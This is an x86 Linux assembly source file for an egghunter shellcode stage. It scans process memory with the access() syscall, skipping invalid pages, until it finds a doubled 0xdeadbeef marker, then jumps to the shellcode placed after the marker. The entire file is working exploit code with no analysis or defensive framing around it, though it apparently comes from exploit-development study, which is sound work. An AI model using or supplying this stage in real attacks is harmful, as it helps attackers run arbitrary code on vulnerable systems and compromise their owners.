global _start

section .text 


_start:

	mov ebx, 0xdeadbeef ; out egg
	xor ecx, ecx ; zero ecx
	mul ecx ; zero eax, edx

next_page:
	or dx, 0xfff ; set page size
next_byte:
	inc edx
	pushad ; save all general purposes register value 
	lea ebx,[edx + 4] ; checking if the address is readable
	mov al, 0x21 ; set eax to syscall access()
	int 0x80 ; execute the syscall

	cmp al, 0xf2 ; check for EFAULT (invalid memory space)
	
	popad ; restor the saved register
	jz next_page ; EFAULT -> next page

	cmp [edx], ebx ; check for the address if it contains egg
	jnz next_byte ; if not, go vack to look for our first egg
	cmp [edx + 4], ebx ; check if the address + 4 
	jnz next_byte ; if not go back 
	lea esi, [edx + 8] ; both eggs are found jmp to edx + 8 where our shellcode is 
	jmp esi
